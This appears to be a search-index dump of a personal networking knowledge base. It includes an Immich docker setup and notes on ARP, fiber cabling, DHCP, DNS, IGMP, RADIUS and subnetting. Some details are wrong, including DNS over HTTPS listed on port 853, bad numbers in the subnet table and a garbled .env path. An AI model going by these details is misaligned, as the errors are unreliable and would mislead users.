hwaccel.ml.yml\n    #   service: cpu # set to one of [armnn, cuda, openvino, openvino-wsl] for accelerated inference - use the `-wsl` version for WSL2 where applicable\n    volumes:\n    - /volume25/docker/immich/upload:/usr/src/app/upload:rw\n    - /volume25/docker/immich/cache:/cache:rw\n    env_file:\n    - stack.env\n    restart: always\n\nredis:\n    container_name: immich_redis\n    image: docker.io/redis:6.2-alpine@sha256:e3b17ba9479deec4b7d1eeec1548a253acc5374d68d3b27937fcfe4df8d18c7e\n    healthcheck:\n    test: redis-cli ping || exit 1\n    restart: always\n\ndatabase:\n    container_name: immich_postgres\n    image: tensorchord/pgvecto-rs:pg16-v0.2.0\n    environment:\n    POSTGRES_PASSWORD: ${DB_PASSWORD}\n    POSTGRES_USER: ${DB_USERNAME}\n    POSTGRES_DB: ${DB_DATABASE_NAME}\n    POSTGRES_INITDB_ARGS: '--data-checksums'\n    volumes:\n    # Do not edit the next line. If you want to change the database storage location on your system, edit the value of DB_DATA_LOCATION in the .env file\n    - ${DB_DATA_LOCATION}\n    healthcheck:\n    test: pg_isready --dbname='${DB_DATABASE_NAME}' --username='${DB_USERNAME}' || exit 1; Chksum=\"$$(psql --dbname='${DB_DATABASE_NAME}' --username='${DB_USERNAME}' --tuples-only --no-align --command='SELECT COALESCE(SUM(checksum_failures), 0) FROM pg_stat_database')\"; echo \"checksum failure count is $$Chksum\"; [ \"$$Chksum\" = '0' ] || exit 1\n    interval: 5m\n    start_interval: 30s\n    start_period: 5m\n    command: [\"postgres\", \"-c\" ,\"shared_preload_libraries=vectors.so\", \"-c\", 'search_path=\"$$user\", public, vectors', \"-c\", \"logging_collector=on\", \"-c\", \"max_wal_size=2GB\", \"-c\", \"shared_buffers=512MB\", \"-c\", \"wal_compression=on\"]\n    restart: always\n\nvolumes:\nmodel-cache:\n</code></pre> <p></p> <p>Scroll down to the env and click on advanced and paste the below, then click on simple.</p> <p>.env file</p> <pre><code>UPLOAD_LOCATION=/volume25/docker/immich/redis:/data:rw\nIMMICH_VERSION=release\nDB_PASSWORD=xxxxxx\nJWT_SECRET=xxxxxx\n\n# The values below this line do not need to be changed\n######################################################\nDB_HOSTNAME=immich\nDB_USERNAME=xxxxxx\nDB_DATABASE_NAME=xxxxxx\nDB_DATA_LOCATION=/volume1/docker/immich/db:/var/lib/postgresql/data:rw\nREDIS_HOSTNAME=redis\nIMMICH_WEB_URL=http://10.10.10.31:3000\nIMMICH_SERVER_URL=http://10.10.10.31:3001\nDISABLE_REVERSE_GEOCODING=false\nREVERSE_GEOCODING_PERCISION=3\nLOG_LEVEL=log\n</code></pre> <p></p> <p>Click Deploy the stack, wait 5 minutes before attempting to access immich. This could take longer if you have a slower Internet connection.</p> <p></p> <p>Open your browser and type in http://Synology-ip-address:8212</p> <p></p> <p>Add your own credentials then click Sign Up</p> <p></p> <p>Now you can login</p> <p></p> <p>Click Theme &gt; choose your theme &gt; Click Storage Template &gt; Click done</p>"},{"location":"Knowledge_Base/Home_Lab/pfSense/","title":"pfSense","text":"<p>Mullvad VPN setup</p>"},{"location":"Knowledge_Base/Network/ARP/","title":"ARP","text":""},{"location":"Knowledge_Base/Network/ARP/#sources","title":"Sources","text":"<p>ARP RFC-826 https://www.erg.abdn.ac.uk/users/gorry/course/inet-pages/arp.html</p>"},{"location":"Knowledge_Base/Network/ARP/#arp","title":"ARP","text":"<p>ARP (Address Resolution Protocol) A way for devices to locate the Ethernet hardware address of another IP host on the same local network. Map IP network addresses to the hardware addresses used by a data link protocol.</p>"},{"location":"Knowledge_Base/Network/ARP/#gratuitous-arp","title":"Gratuitous ARP","text":"<p>Gratuitous ARP is used when a node (end system) has selected an IP address and then wishes to defend its chosen address on the local area network (i.e. to check no other node is using the same IP address). It can also be used to force a common view of the node's IP address (e.g. after the IP address has changed).</p> <p>Use of this is common when an interface is first configured, as the node attempts to clear out any stale caches that might be present on other hosts. The node simply sends an arp request for itself.</p>"},{"location":"Knowledge_Base/Network/ARP/#proxy-arp","title":"Proxy ARP","text":"<p>Proxy ARP is the name given when a node responds to an arp request on behalf of another node. This is commonly used to redirect traffic sent to one IP address to another system.</p> <p>Proxy ARP can also be used to subvert traffic away from the intended recipient. By responding instead of the intended recipient, a node can pretend to be a different node in a network, and therefore force traffic directed to the node to be redirected to itself. The node can then view the traffic (e.g. before forwarding this to the originally intended node) or could modify the traffic. Improper use of Proxy ARP is therefore a significant security vulnerability and some networks therefore implement systems to detect this. Gratuitous ARP can also help defend the correct IP to MAC bindings.</p>"},{"location":"Knowledge_Base/Network/ARP/#types-of-arp-messages","title":"Types of arp messages","text":"<p>There are four types of arp messages that may be sent by the arp protocol. These are identified by four values in the \"operation\" field of an arp message. The types of message are:</p> <ul> <li>ARP-Request (Broadcast, source IP address of the requester) -ARP-Reply (Unicast to requester, the target)</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/","title":"Cabling Fiber","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#fiber-cable-types","title":"Fiber Cable Types","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#single-mode-fiber","title":"Single mode fiber","text":"<p>Long Haul [LX] | Long Distances up to 5 KM Uses Laser as light source Higher cost Usually Yellow in color Supports both Simplex &amp; Duplex Much thinner at 8.3-10 microns</p> <p></p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#multimode-fiber","title":"Multimode fiber","text":"<p>Short Haul [SX] | Short Distances Uses LED as light source Lower cost Usually Orange in color Supports both Simplex &amp; Duplex Thicker at 50-100 microns</p> <p></p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#connector-types","title":"Connector Types","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#st-connectors-straight-tip","title":"ST connectors [Straight Tip]","text":"<p>These connectors are the most common type of commercial fiber optic connector. These connectors utilize an exposed plastic tube housing the optical fiber. This requires a connection to a matching cable on the other side, incorporating a connector that mates to the other.</p> <p>These combine in a spring-loaded twist, reminiscent of BNC connectors, and are noted for their reliability. ST connector is very popular in communication applications, such as LANs and CCTV systems. used Fiber optic connectors in networking applications</p> <p></p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#sc-connector-subscriber-connect","title":"SC-Connector [Subscriber Connect]","text":"<p>SC is short for Subscriber Connect is one of the most frequently used connectors. Used in fiber-optic networking, it has caps to prevent laser light reaching eyes. The connector usually in pairs (transmit and receive), often clipped together. connectors have the ferrule that houses the fiber mostly concealed. Probably the most similar commercial equivalent off to slink, SC connectors does not require a mating cable on the other side. Instead, these Snap-On connectors simply push into their jacks with a click. SC connectors use a push-pull design and can be used for simplex or multiplex applications</p> <p></p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#fc-connector-ferrule-connector","title":"FC connector [Ferrule connector]","text":"<p>It is similar to ST connectors, these fiber optic connector's screws into their mating jacks. Additionally, the tube surrounding the optical fiber is typically shrouded in ceramic or metal, as opposed to being fully exposed. The inner ring of the connector is keyed to ensure positive mating to its corresponding jack. FC connectors are primarily used with single mode fibers and used in telephone, instruments, and high-speed communication links. The style is similar to that of an ST connector, but it uses a threaded connection which makes it better suited for high vibration environments</p> <p></p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#lc-cables-lucent-connector","title":"LC cables [Lucent Connector]","text":"<p>latch and release into their jacks in a manner similar to Ethernet connectors. Smaller in form than SC connectors, their durability is not compromised, nor is cost increased. Instead of snapping or thermo forming the connector to the cable, it is glued. This makes it a popular connector for field use. LC connectors are used in private and public networks, and are gaining in popularity due to their small form factor (SFF) optical transmitter/receiver assembly</p> <p>Below LC has 2 pairs, LC can also come in single connnector form</p> <p></p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#fiber-patch-cable-types","title":"Fiber Patch Cable Types","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#lc-to-lc","title":"LC to LC","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#lc-to-sc","title":"LC to SC","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#lc-to-fc","title":"LC to FC","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#lc-to-st","title":"LC to ST","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#sc-to-sc","title":"SC to SC","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#sc-to-st","title":"SC to ST","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#st-to-st","title":"ST to ST","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#fiber-patch-modes","title":"Fiber Patch Modes","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#single-mode-fiber-patch-cable","title":"Single mode fiber patch cable","text":"<ul> <li>Long Distances</li> <li>Mostly use over large areas such as Campuses, TV networks</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#multimode-fiber-patch-cable","title":"Multimode fiber patch cable","text":"<ul> <li>Short distances</li> <li>Most Used in LAN applications</li> <li>Aqua patch cables are higher performance 10Gbps, 40Gbps, and 100Gbps - Ethernet and fiber channel applications.</li> </ul> <p>Fiber Cables Distance </p> <p>Note: - 1000 Base-SX = SX = \"short haul\" - 1000 Base-LX = LX = \"Long haul\"</p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#types-of-single-mode-fiber-cable-and-specifications","title":"Types of Single Mode Fiber Cable and Specifications","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#os1-single-mode-tight-buffered-cable","title":"OS1 Single Mode Tight Buffered Cable","text":"<ul> <li>Indoor Use: Used in LANs and point-to-point links in cities, buildings, factories, office parks or campuses</li> <li>Distance 2 KM</li> <li>Construction Tight Buffered [manufactured into solid medium]</li> <li>Attenuation 1.0db/km</li> <li>Less Expensive</li> <li>OS1 can support speeds up to 10G and distances up to about 10 KM</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#os2-single-mode-loose-tube-cable","title":"OS2 Single Mode Loose Tube Cable","text":"<ul> <li>Outdoor use: Used in street, underground/burial, etc.\u2026</li> <li>Distance 10 KM</li> <li>Construction Loose Tube [not held in medium but blown or otherwise inserted into carrier]</li> <li>Attenuation 0.4db/km</li> <li>More expensive</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#single-mode-polish-types","title":"Single Mode Polish Types","text":"<p>UPC and APC connectors cannot be mated due to the angle of the APC connector. The connector types are not interchangeable. Always verify the type of connector required. If a single mode connector is recommended and no polish is specified, utilize UPC connectors. If APC connectors are required, you must install APC connectors.</p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#connector-color-codes","title":"Connector Color Codes","text":"<p>Note: Cable colors are not set in stone and can't fully depend on them.</p> <p>Color-coding varies by manufacturer</p> <p>Connectors are often color-coded for easy identification. The chart below shows this with LC connectors.</p> <p></p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#what-is-meant-by-attenuation-in-networking","title":"What is meant by Attenuation in Networking?","text":"<p>Attenuation is the gradual loss of signal strength over a distance and it\u2019s measured in dB decibels. This loss can be caused by a distortion, interference, noise, distance, physical surrounding (temperature, walls, wire insulation), etc..</p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#what-is-a-good-attenuation","title":"What is a good Attenuation?","text":"<p>A good Attenuation is that one that can hold great signal strength over long istances and the more it can the hold the better.</p> <p>So, when we look at OS1 vs OS2 cables you will notice that OS1 with 1.0 dB/KM has only a distance of 2 KM and OS2 with 0.4 dB/KM has a distance of 10 KM. The lower the Attenuation the less signal you are losing over a distance which in turn will lead to increased distance with a good signal strength.</p> <p>But always remember that these are just number and not set in stone, these are a lot of factors that can impact a signal Attenuation.</p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#what-type-of-media-can-be-affected-by-attenuation","title":"What type of media can be affected by Attenuation?","text":"<ul> <li>Copper Cables</li> <li>Fiber Cables</li> <li>Satellite</li> <li>Radio Signals</li> <li>Wireless Networks</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#types-of-multimode-fiber-cable-and-specifications","title":"Types of Multimode Fiber Cable and Specifications","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber/#om1","title":"OM1","text":"<ul> <li>Jacket Color \u2013 Orange</li> <li>Application \u2013 Short-haul networks, Local Area Networks (LANs) &amp; private - networks</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#om2","title":"OM2","text":"<ul> <li>Jacket Color \u2013 Orange</li> <li>Application \u2013 Short-haul networks, Local Area Networks (LANs) &amp; private - networks</li> <li>Generally used for shorter distances. Has twice the distance capacity has OM1</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#om3-laser-optimized-multimode","title":"OM3 \u2013 Laser-Optimized Multimode","text":"<ul> <li>Jacket Color \u2013 Aqua</li> <li>Uses fewer modes of light, enabling increased speeds</li> <li>Able to run 40GB or 100GB up to 100 meters utilizing an MPO connector</li> <li>Application \u2013 Larger Private Networks</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#om4-laser-optimized-multimode","title":"OM4 \u2013 Laser Optimized Multimode","text":"<ul> <li>Jacket Color \u2013 Aqua</li> <li>Able to run 100GB up to 150 meters utilizing an MPO connector</li> <li>Application \u2013 High-Speed Networks, Data Centers, Financial Centers and - Corporate Campuses</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#om5-the-latest-and-greatest-in-multimode-fiber","title":"OM5 \u2013 The latest and greatest in Multimode Fiber","text":"<ul> <li>Jacket Color \u2013 Lime Green</li> <li>Fully compatible and can mate with OM3 and OM4 cabling</li> <li>Utilizes a wider range of wavelengths between 850nm and 953nm</li> <li>Designed to support Short Wavelength Division Multiplexing (SWDM)</li> <li>Can Transmit 40 Gb/s and 100 Gb/s</li> <li>Application \u2013 High-speed Networks and Data Centers that require greater link - distances and higher speeds</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber/#fiber-cable-history","title":"Fiber Cable History","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber_SFPs/","title":"Cabling Fiber SFPs","text":"<p>Fiber Transceivers SFP (Small Form-Factor Pluggable)</p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber_SFPs/#what-is-an-sfp-and-why-is-it-used","title":"What is an SFP and why is it used?","text":"<p>It\u2019s a Small Form-Factor Pluggable transceiver that is used to connect a switch, router, firewall or other network devices to Copper or Fiber cables. SFP is sometimes called a mini-GBIC since they are small giga bit interfaces. Performs Electrical and Optical conversions to extend original length distance.</p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber_SFPs/#what-is-the-difference-between-single-mode-sfp-and-multi-mode-sfp","title":"What is the difference between Single Mode SFP and Multi-Mode SFP?","text":"<p>Cable type used are different Transmission distance is different Single Mode SFP is more expensive You can check below table for more information on speeds, distances, and connector types.</p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber_SFPs/#sfp-types","title":"SFP Types","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber_SFPs/#simplex-sfp","title":"Simplex SFP","text":"<p>transmits only one direction at a time which in below you is represented by Single Fiber Port</p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber_SFPs/#duplex-sfp-or-bidi-transceiver","title":"Duplex SFP or BiDi Transceiver","text":"<p>can Send and Receive at the same time which below is represented by Dual Fiber Port, it should be used in pairs with the same Wavelength</p> <p> </p>"},{"location":"Knowledge_Base/Network/Cabling_Fiber_SFPs/#what-is-the-difference-between-sfp-and-sfp","title":"What is the difference between SFP and SFP+?","text":""},{"location":"Knowledge_Base/Network/Cabling_Fiber_SFPs/#sfp","title":"SFP","text":"<ul> <li>Supports up to 4.25 Gbps</li> <li>Shorter transmission distance [Check SFP Types table]</li> <li>In most cases you can plug an SFP into an SFP+ but the speed will be limited to 1 Gbps</li> </ul>"},{"location":"Knowledge_Base/Network/Cabling_Fiber_SFPs/#sfp_1","title":"SFP+","text":"<ul> <li>Supports speeds up to 10 Gbps</li> <li>Longer transmission distance [Check SFP Types table]</li> <li>SFP+ accepts SFP optics but at a reduced speed of 1 Gbps</li> <li>You can\u2019t plug SFP+ into an SFP port since SFP+ doesn\u2019t support speeds - less than 1 Gbps</li> </ul>"},{"location":"Knowledge_Base/Network/DHCP/","title":"DHCP","text":""},{"location":"Knowledge_Base/Network/DHCP/#summary","title":"Summary","text":"<p>DHCP [Dynamic Host Configuration Protocol] uses DORA [Discover Offer Request Acknowledge] to provide client devices with Network information automatically (IP Address, Subnet, etc.)</p>"},{"location":"Knowledge_Base/Network/DHCP/#dora-workflow","title":"DORA workflow","text":""},{"location":"Knowledge_Base/Network/DHCP/#allocating-a-new-network-address","title":"Allocating a new network address","text":"<p>Diagram of messages exchanged between DHCP client and servers when allocating a new network address</p> <p></p>"},{"location":"Knowledge_Base/Network/DHCP/#reusing-a-previously-allocated-network-address","title":"Reusing a previously allocated network address","text":"<p>Diagram of messages exchanged between DHCP client and servers when reusing a previously allocated network address</p> <p></p>"},{"location":"Knowledge_Base/Network/DHCP/#dhcp-client-state-transition","title":"DHCP Client State transition","text":"<p>State-transition diagram for DHCP clients</p> <p></p>"},{"location":"Knowledge_Base/Network/DHCP/#_1","title":"DHCP","text":""},{"location":"Knowledge_Base/Network/DHCP/#wireshark-example","title":"Wireshark example","text":""},{"location":"Knowledge_Base/Network/DHCP/#resources","title":"Resources","text":"<p>DHCP RFC-1531</p>"},{"location":"Knowledge_Base/Network/DNS/","title":"DNS","text":"<p>DNS [Domain Name System] types</p> <ul> <li> <p>DNS Port 53</p> <ul> <li>(rfc8499 - DNS Terminology)[https://datatracker.ietf.org/doc/html/rfc8499]</li> <li>(rfc1035 - DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION)[https://datatracker.ietf.org/doc/html/rfc1035]</li> <li>(rfc1034 - DOMAIN NAMES - CONCEPTS AND FACILITIES)[https://datatracker.ietf.org/doc/html/rfc1034]</li> </ul> </li> <li> <p>DNS over HTTPS (doh) Port 853</p> <ul> <li>(rfc8484)[https://datatracker.ietf.org/doc/html/rfc8484]</li> </ul> </li> <li> <p>DNS over TLS (dot)</p> <ul> <li>(rfc7858)[https://datatracker.ietf.org/doc/html/rfc7858]</li> </ul> </li> <li> <p>DNS over TLS and DNS over DTLS</p> <ul> <li>(rfc8310)[https://datatracker.ietf.org/doc/html/rfc8310]</li> </ul> </li> <li> <p>DNSSEC (DNS Security Extensions)</p> <ul> <li>(rfc9364) [https://datatracker.ietf.org/doc/html/rfc9364]</li> </ul> </li> </ul>"},{"location":"Knowledge_Base/Network/DNS/#how-dns-works-high-level","title":"How DNS Works - high level","text":""},{"location":"Knowledge_Base/Network/DNS/#how-dns-works-lower-level","title":"How DNS Works - lower level","text":"<p>lower level dns - click to open PDF in new tab</p> <p></p>"},{"location":"Knowledge_Base/Network/DNS/#root-server-names","title":"Root Server Names","text":""},{"location":"Knowledge_Base/Network/DNS/#packet-capture-samples","title":"packet capture samples","text":"<ul> <li>DNS over TLS proxied - no TLS on LAN</li> <li>chrome-doh-example.pcapng</li> <li>chrome-doh-example-with-secrets.pcapng</li> </ul>"},{"location":"Knowledge_Base/Network/DNS/#troubleshooting","title":"Troubleshooting","text":"<p>https://www.dnsleaktest.com/results.html</p>"},{"location":"Knowledge_Base/Network/IGMP/","title":"IGMP","text":""},{"location":"Knowledge_Base/Network/IGMP/#summary","title":"Summary","text":"<p>IGMP (Internet Group Management Protocol) allows several devices to share one IP address so they can all receive the same data.</p> <p>Unicast/Multicast can be used in streaming videos or other services, functions on Layer 2 of the OSI Layer.</p> <p></p>"},{"location":"Knowledge_Base/Network/IGMP/#igmp-devices","title":"IGMP devices","text":"<ul> <li>IGMP device: A switch or router running IGMP traffic control features.</li> <li>IGMP host: An end-node device running an IGMP (multipoint or multicast communication) application.</li> <li>Querier: <ul> <li>A required IGMP device that facilitates IGMP protocol and traffic flow on a given LAN. This device tracks which ports are connected to devices (IGMP clients) that belong to specific multicast groups and triggers updates of this information.</li> <li>A querier uses data received from the queries to determine whether to forward or block multicast traffic on specific ports.</li> <li>When the switch has an IP address on a given VLAN, the switch automatically operates as a querier for that VLAN if it does not detect a multicast router or another switch functioning as a querier.</li> <li>When enabled (the default state), the switch\u2019s querier function eliminates the need for a multicast router. In most cases, HP recommends that you leave this parameter in the default enabled state even if you have a multicast router performing the querier function in your multicast group. For more information, see How IGMP operates.</li> </ul> </li> </ul>"},{"location":"Knowledge_Base/Network/IGMP/#igmp-basics","title":"IGMP Basics","text":"<p>IGMP used by a Host to notify the local Router that it wishes to receive (or stop receiving) multicast traffic for a given group address. Below diagram shows a basic multicast service model. IGMP\u2019s functionality is shown in item 2.b in the diagram.</p> <p></p> <p>There are 3 versions (IGMP v1, IGMP v2 &amp; IGMP v3) available. The most common version of deployment is IGMP v2. Once you enable PIM on a layer 3 interface it will automatically enable IGMPv2 on that interface. If a host want to join for a particular multicast group, they will send a IGMP Membership report to 224.0.0.2 (all-routers in local subnet) &amp; first\u00a0 hop router will get it. When another host in the same network requesting same group, layer 2 switch will suppress that request. You can disable this feature by using \u201cno ip igmp snooping report-suppression\u201d command if needed.</p> <p></p> <p>Normally (without IGMP snooping) a switch will forward a multicast frame to all switch ports (except incoming port). IGMP snooping allows the switch to send multicast frames only to those receivers that join a particular group by listening for report/leave messages from the hosts. By default this feature is enabled on a layer 2 switch. If you want to enable is only on particular VLAN you can disable it globally &amp; configure \u201cip igmp snooping vlan vlan-id\u201d with required vlan-id.</p> <p>When a client want to leave the group they will send a \u201cIGMP Leave Msg\u201d to 224.0.0.2 (&amp;\u00a0 first hop router will get it). Then router will query \u201cIGMP Query Msg\u201d to 224.0.0.1 (All-Host multicast address). As long as at least one client is in this group, switch will forward IGMP Membership report back to first hop router. In IGMP v2.0 you can configure fast-leaving feature by using \u201cip igmp snooping vlan vlan-id immediate-leave\u201c. In this way switch will immediately remove the port from multicast forwarding table.</p> <p></p> <p>If no users join for the multicast group, router will not get any response &amp; it will wait for 3 x query interval to decide no users require this multicast stream any longer. Then it will pass that info to upstream routers to stop forwarding multicast traffic to that group.</p> <p></p> <p>Compare to IGMPv2, IGMPv3 has following advantages</p> <ol> <li>Hosts can join one group and leave another in the same transaction. IGMPv2 requires separate report/leave messages.  </li> <li>Reduces the likelyhood of multicast group being spoofed by a rogue source.  </li> <li>Eliminates overlapping multicast addresses.  </li> <li>First-hop router immediately knows the source address, so no need for RP (Rendezvous Point) \u2013 can use PIM-SSM.</li> </ol> <p>Following shows IGMPv3 operation. In IGMPv3 all host membership reports send to 224.0.0.22 (IGMPv3 routers multicast address). There is no report-suppression in IGMPv3.</p> <p></p> <p></p>"},{"location":"Knowledge_Base/Network/LDAP/","title":"LDAP","text":"<p>LDAP (Lightweight Directory Access Protocol)</p>"},{"location":"Knowledge_Base/Network/Network_Fundamentals/","title":"Network Fundamentals","text":"<p>In this document, I will try to include as much information about Networking basics such as layers, protocols, devices, operations, functions, and other data. I thought of many ways to split this material and I think the best way is to have it done over the OSI model and explain everything I can within each OSI Layer of course with providing some visual explanations when I can.</p> <p>extra resource:</p> <ul> <li>osi model mindmap</li> </ul>"},{"location":"Knowledge_Base/Network/Network_Fundamentals/#introduction-to-the-osi-model","title":"Introduction to the OSI Model","text":"<p>I will keep the introduction very clear and simple and I will follow with more detailed explanations on each layer focusing on the first 4 layers of the OSI Model.</p>"},{"location":"Knowledge_Base/Network/Network_Fundamentals/#what-is-the-osi-model-and-its-layers","title":"What is the OSI Model and its Layers?","text":"<p>OSI stands for Open Systems Interconnections and it is a concept created to simplify and standardize the communication functions of telecommunication or computing system.</p>"},{"location":"Knowledge_Base/Network/Network_Fundamentals/#the-osi-model-7-layers","title":"The OSI Model 7 Layers","text":"<p>One of the famous mnemonic phrases you can use to remember this model is \u201cPlease Do Not Throw Sausage Pizza Away\u201d which starts at Layer 1 and moves towards Layer 7.</p>"},{"location":"Knowledge_Base/Network/Network_Fundamentals/#its-not-all-about-the-osi-model","title":"It\u2019s not all about the OSI Model","text":"<p>We have other Models in this universe and the other model is the TCP/IP Model (Transmission Control Protocol / Internet protocol), I thought I should add in a representation of how they both compare and what do we call layers in these two different models.</p> <p>You can see each Layer of each Model and what it equates to on its neighboring Model</p> <p></p>"},{"location":"Knowledge_Base/Network/Network_Fundamentals/#data-encapsulation-pdus","title":"Data Encapsulation / PDUs","text":"<p>The below is a representation of the Data Encapsulation and Protocol Data Unit of the Ethernet Frame</p> <p></p> <p></p>"},{"location":"Knowledge_Base/Network/Network_Fundamentals/#osi-os-level","title":"OSI - OS Level","text":"<p>This will give you an idea of which portion of the Network Adapter settings in Windows environment are represented by which Layer on the OSI Model</p> <p></p>"},{"location":"Knowledge_Base/Network/Network_Fundamentals/#tcpip-quick-guide","title":"TCP/IP Quick Guide","text":"<p>for better view click to open PDF in a new tab</p> <p></p>"},{"location":"Knowledge_Base/Network/OUI_Device_MAC_Addresses/","title":"OUI Device MAC Addresses","text":"<p>If you want to know what type of device is connected to your Network, you can identify the device by its Physical Address (MAC Address).</p> <p>Keep in mind if the device like a Mobile Phone or Laptop has \"Private Addressing\" or \"MAC Randomization\" enabled, you most likely won't be able to tell what brand/vendor the device is.</p> <p>aruljohn</p> <p>In th example below you can see the MAC Address returned Vendor is Ruckus</p> <p></p>"},{"location":"Knowledge_Base/Network/Radius/","title":"Radius","text":""},{"location":"Knowledge_Base/Network/Radius/#radius-ports","title":"Radius Ports","text":"Radius Type Default Radius Port Radius Authentication 1812 Radius Accounting 1813"},{"location":"Knowledge_Base/Network/Radius/#radius-codes","title":"Radius Codes","text":"Radius Code Description Access-Reject (Code 3) Indicates that the user's credentials (username and/or password) are invalid Access-Challenge (Code 11) Indicates that additional information is required from the user before access can be granted NAS-Identification-Mismatch (Reason-Code 18) Indicates that the NAS (Network Access Server) identification in the request does not match the configured value on the RADIUS server Authentication-Failure (Reason-Code 19) Indicates that the authentication method used in the request is not supported or is not configured on the RADIUS server Unknown-User-Name (Reason-Code 20) Indicates that the user's username is not found in the user database on the RADIUS server User-Name-Ambiguity (Reason-Code 21) Indicates that the user's username is found multiple times in the user database on the RADIUS server User-Account-Expired (Reason-Code 22) Indicates that the user's account has expired User-Account-Disabled (Reason-Code 23) Indicates that the user's account has been disabled User-Account-Inactive (Reason-Code 24) Indicates that the user's account is inactive User-Account-Valid (Reason-Code 25) Indicates that the user's account is not valid"},{"location":"Knowledge_Base/Network/Radius/#radius-wireshark-display-filter","title":"Radius Wireshark Display Filter","text":"Display Filter Description <code>radius</code> Show only the RADIUS traffic <code>radius.code == 1</code> Show only RADIUS Access-Request messages <code>radius.code == 2</code> Show only RADIUS Access-Accept messages <code>radius.code == 3</code> Show only RADIUS Access-Reject messages <code>radius.code == 4</code> Accounting Request <code>radius.time &gt;= 2</code> Show only RADIUS response messages that take longer than two seconds from the request <code>radius.Acct_Status_Type == 1</code> Show only RADIUS Accounting-Request[start] messages <code>radius.Acct_Status_Type == 2</code> Show only RADIUS Accounting-Request[stop] messages <code>radius.code == 3 and radius.Reply_Message contains \"password\"</code> Show only RADIUS Access-Reject messages that come with an Reply-Message attribute containing \"password\""},{"location":"Knowledge_Base/Network/Radius/#radius-wireshark-capture-filter","title":"Radius Wireshark Capture Filter","text":"Capture Filter Description <code>udp port 1812</code> Capture RADIUS authentication and configuration traffic over the assigned port (1812) <code>udp port 1813</code> Capture RADIUS accounting traffic over the assigned port (1813) <code>udp port 1812 or udp port 1813</code> Capture RADIUS authentication and configuration traffic, and RADIUS accounting traffic, over the assigned ports"},{"location":"Knowledge_Base/Network/SNMP/","title":"SNMP","text":""},{"location":"Knowledge_Base/Network/SNMP/#snmp-set","title":"SNMP set","text":"<p>SNMP set allows you to make changes to device configuration using OID of the device's MIB, for instance, enabling telnet through SNMP.</p> <p>I use ezfive SnmpSet.exe, you can download it and then open a <code>cmd</code> windows, navigate to the exe file location then call it and pass the values to it.</p> <p>Note that you cannot just copy pasta the below, you will need to change the values based on MIB/OID and host.</p> <pre><code>snmpset.exe -r:192.168.1.10 -c:password -t:10  -tp:int -v:2c -o:.1.3.6.1.4.1.1234.1.1.2.1.32.0 -val:1\n</code></pre>"},{"location":"Knowledge_Base/Network/SNMP/#other-tools","title":"Other tools","text":"<p>If you get your hands on a MIB from whatever vendor, using something like ireasoning MIB Browser might help you dig down into the OIDs and understand their values, description and data types.</p> <p>Other useful tools SnmpGet &amp; SnmpWalk.</p>"},{"location":"Knowledge_Base/Network/Subnetting/","title":"Subnetting","text":"<p>WILL BE EXPLAINED SOON</p> 128 64 32 16 8 4 2 1 128 192 224 240 248 252 254 255 25 26 27 28 29 30 31 32 32,768 16,384 8,192 4,096 2,048 1,024 512 256 128 192 224 240 248 252 254 255 17 18 19 20 21 22 23 24 8,388,608 4,194,304 2,097,152 1,048,576 524,288 262,144 131,072 65,536 128 192 224 240 248 252 254 255 9 10 11 12 13 14 15 16 5,368,709,120 2,684,354,560 134,217,780 268,435,456 134,217,728 67,108,864 33,554,432 16,777,216 128 192 224 240 248 252 254 255 1 2 3 4 5 6 7 8 128 64 32 16 8 4 2 1 128 192 224 240 248 252 254 255 32,768 16,384 8,192 4,096 2,048 1,024 512 256 8,388,608 4,194,304 2,097,152 1,048,576 524,288 262,144 131,072 65,536 5,368,709,120 2,684,354,560 134,217,780 268,435,456 134,217,728 67,108,864 33,554,432 16,777,216 25 26 27 28 29 30 31 32 17 18 19 20 21 22 23 24 9 10 11 12 13 14 15 16 1 2 3 4 5 6 7 8 ---"},{"location":"Knowledge_Base/Network/Subnetting/#summary","title":"Summary","text":"<p>I personally think this is the easiest way to learn Subnetting, watch the full series from Practical Networking on Youtube What is Subnetting? - Subnetting Mastery - Part 1 of 7</p>"},{"location":"Knowledge_Base/Network/Subnetting/#subnetting-attributes","title":"Subnetting attributes","text":"<ul> <li>Network ID</li> 